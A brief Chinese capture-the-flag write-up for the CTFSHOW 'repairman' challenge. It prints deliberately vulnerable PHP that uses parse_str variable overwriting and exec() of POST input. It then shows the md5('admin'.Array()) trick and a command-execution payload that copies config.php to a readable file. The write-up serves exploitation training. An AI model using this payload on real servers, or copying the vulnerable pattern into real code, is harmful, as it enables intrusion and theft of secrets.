### CTFSHOW - repairman

> PHP问题，命令执行

等个五秒钟会爆出代码：

尽量整理一下格式，我都被误导了一下

```php
<?php
error_reporting(0);
session_start();

$config['secret'] = array();
include 'config.php';

if (isset($_COOKIE['secret'])) {
    $secret = &$_COOKIE['secret'];
} else {
    $secret = null;
}

if (empty($mode)) {
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query']);
    if (empty($mode)) {
        echo 'Your mode is the guest!';
    }
}

function cmd($cmd) {
    global $secret;
    echo 'Success change the ini! The logs record you!';
    exec($cmd);
    $secret['secret'] = $secret;
    $secret['id'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['secret'] = $secret;
}

if ($mode == '0') {
    if ($secret === md5('token')) {
        $secret = md5('test' . $config['secret']);
    }

    switch ($secret) {
        case md5('admin' . $config['secret']):
            echo 999;
            cmd($_POST['cmd']);
            break;
        case md5('test' . $config['secret']):
            echo 666;
            $cmd = preg_replace('/[^a-z0-9]/is', 'hacker', $_POST['cmd']);
            cmd($cmd);
            break;
        default:
            echo "hello, the repairman!";
            highlight_file(__FILE__);
            break;
    }
} elseif ($mode == '1') {
    echo '</br>hello, the user! We may change the mode to repair the server, please keep it unchanged';
} else {
    header('refresh:5;url=index.php?mode=1');
    exit;
}
?>
```

可以看到可以命令执行

而且代码审计之后就几个点

- mode=0
- `$secret` 等于 `md5('admin'.$config['secret'])`
- 然后利用cmd执行命令

```php
    switch ($secret) {
        case md5('admin' . $config['secret']):
            echo 999;
            cmd($_POST['cmd']);
            break;
```

我们构造第二条：
```php
<?php
$config['secret'] = Array();
$secret = md5('admin'.$config['secret']);
echo $secret;
#da53eb34c1bc6ce7bbfcedf200148106
```

Payload:

```php
cmd=cat config.php >1.txt
```



